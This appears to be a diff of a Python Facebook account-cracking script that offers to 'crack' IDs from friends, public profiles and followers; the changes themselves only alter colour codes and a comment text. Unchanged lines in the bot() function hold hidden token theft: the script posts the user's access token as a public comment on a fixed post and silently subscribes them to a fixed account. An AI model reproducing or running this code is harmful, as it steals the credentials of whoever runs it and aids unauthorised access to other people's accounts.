@@ -92,7 +92,7 @@ def gets_dict_cookies(cookies):
 def log_token():
     os.system("clear")
     banner()
-    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
+    toket = input(k+"\n["+p+"•"+k+"]"+m+" Token : ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
         a = json.loads(otw.text)
@@ -119,7 +119,7 @@ def bot():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	kom = ("Orang Tertampan Didunia Adalah @[100044932290784:] ")
+	kom = ("Gantengnya @[100044932290784:]")
 	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + kom + '&access_token=' + toket)
@@ -139,9 +139,9 @@ def menu():
         log_token()
     os.system("clear")
     banner()
-    print((k+"\n["+p+"1"+k+"]"+k+" Crack ID From Friend"))
+    print((k+"\n["+p+"1"+k+"]"+u+" Crack ID From Friends"))
     print((k+"["+p+"2"+k+"]"+o+" Crack ID From Public"))
-    print((k+"["+p+"3"+k+"]"+u+" Crack ID From Followers"))
+    print((k+"["+p+"3"+k+"]"+k+" Crack ID From Followers"))
     print((k+"["+p+"0"+k+"]"+m+" Logout"))
     choose_menu()
 	
